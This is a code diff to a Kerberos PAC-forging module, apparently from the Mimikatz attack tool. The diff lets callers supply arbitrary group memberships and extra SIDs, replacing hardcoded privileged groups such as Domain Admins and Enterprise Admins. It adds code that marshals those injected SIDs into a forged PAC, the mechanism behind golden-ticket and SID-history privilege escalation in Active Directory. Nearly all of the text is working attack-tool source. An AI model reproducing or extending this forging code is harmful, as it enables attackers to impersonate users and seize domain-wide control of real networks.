@@ -5,8 +5,7 @@
 */
 #include "kuhl_m_kerberos_pac.h"
 
-GROUP_MEMBERSHIP kuhl_m_pac_defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
-BOOL kuhl_m_pac_giveMePac(PCSTR Username, PSID DomainSid, DWORD UserId, KerberosTime *AuthTime, DWORD SignatureType, EncryptionKey * SignatureKey, _octet1 *pac)
+BOOL kuhl_m_pac_giveMePac(PCSTR Username, PSID DomainSid, DWORD UserId, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, KerberosTime *AuthTime, DWORD SignatureType, EncryptionKey * SignatureKey, _octet1 *pac)
 {
 	BOOL status = FALSE;
 	KERB_VALIDATION_INFO validationInfo = {0};
@@ -17,7 +16,7 @@ BOOL kuhl_m_pac_giveMePac(PCSTR Username, PSID DomainSid, DWORD UserId, Kerberos
 	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
 	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
 	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);
-	RtlInitUnicodeString(&validationInfo.LogonDomainName, L"eo.oe.kiwi :)");
+	RtlInitUnicodeString(&validationInfo.LogonDomainName, L"<3 eo.oe ~ ANSSI E>");
 
 	pac->length = 0;
 	pac->value = NULL;
@@ -29,9 +28,14 @@ BOOL kuhl_m_pac_giveMePac(PCSTR Username, PSID DomainSid, DWORD UserId, Kerberos
 
 		validationInfo.UserId				= UserId;
 		validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
-		validationInfo.PrimaryGroupId		= kuhl_m_pac_defaultGroups[0].RelativeId;
-		validationInfo.GroupCount = ARRAYSIZE(kuhl_m_pac_defaultGroups);
-		validationInfo.GroupIds = kuhl_m_pac_defaultGroups;
+		validationInfo.PrimaryGroupId		= groups[0].RelativeId;
+		validationInfo.GroupCount = cbGroups;
+		validationInfo.GroupIds = groups;
+		validationInfo.SidCount = cbSids;
+		validationInfo.ExtraSids = sids;
+
+		if(cbSids && sids)
+			validationInfo.UserFlags |= 0x20;
 
 		if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
 		{
@@ -239,6 +243,39 @@ BOOL kuhl_m_pac_marshall_sid(PISID pSid, PVOID * current, DWORD * size)
 	return status;
 }
 
+BOOL kuhl_m_pac_marshall_extrasids(PKERB_VALIDATION_INFO validationInfo, RPCEID base, PVOID * current, DWORD * size)
+{
+	BOOL status = FALSE;
+	PVOID newbuffer;
+	PBYTE ptr;
+	DWORD i, actualsize = sizeof(DWORD) + validationInfo->SidCount * (sizeof(RPCEID) + sizeof(DWORD));
+
+	if(newbuffer = LocalAlloc(LPTR, *size + actualsize))
+	{
+		RtlCopyMemory(newbuffer, *current, *size);
+		ptr = (PBYTE) newbuffer + *size;
+		*(PDWORD) ptr = validationInfo->SidCount;
+		
+		for(
+			i = 0, base += 4, ptr += sizeof(DWORD);
+			i < validationInfo->SidCount;
+			i++, base += 4, ptr += sizeof(RPCEID) + sizeof(DWORD)
+			)
+		{
+			*(RPCEID *) ptr = base;
+			*(PDWORD) (ptr + sizeof(RPCEID)) = validationInfo->ExtraSids[i].Attributes;
+		}
+		LocalFree(*current);
+		*current = newbuffer;
+		*size += actualsize;
+
+		status = TRUE;
+		for(i = 0; (i < validationInfo->SidCount) && status; i++)
+			status = kuhl_m_pac_marshall_sid(validationInfo->ExtraSids[i].Sid, current, size);
+	}
+	return status;
+}
+
 BOOL kuhl_m_pac_validationInfo_to_LOGON_INFO(PKERB_VALIDATION_INFO validationInfo, PRPCE_KERB_VALIDATION_INFO * rpceValidationInfo, DWORD *rpceValidationInfoLength)
 {
 	BOOL status = FALSE;
@@ -299,8 +336,17 @@ BOOL kuhl_m_pac_validationInfo_to_LOGON_INFO(PKERB_VALIDATION_INFO validationInf
 
 	rpce.infos.Reserved3 = validationInfo->Reserved3;
 
-	rpce.infos.SidCount = 0; //validationInfo->SidCount;
-	rpce.infos.ExtraSids = 0; // lazy;
+	if(validationInfo->SidCount && validationInfo->ExtraSids)
+	{
+		rpce.infos.SidCount = validationInfo->SidCount;
+		rpce.infos.ExtraSids = PACINFO_ID_KERB_EXTRASIDS;
+		kuhl_m_pac_marshall_extrasids(validationInfo, PACINFO_ID_KERB_EXTRASIDS, &buffer, &szBuffer);
+	}
+	else
+	{
+		rpce.infos.SidCount = 0;
+		rpce.infos.ExtraSids = 0;
+	}
 	rpce.infos.ResourceGroupDomainSid = 0; //lazy
 	rpce.infos.ResourceGroupCount = 0; //validationInfo->ResourceGroupCount;
 	rpce.infos.ResourceGroupIds = 0; // lazy
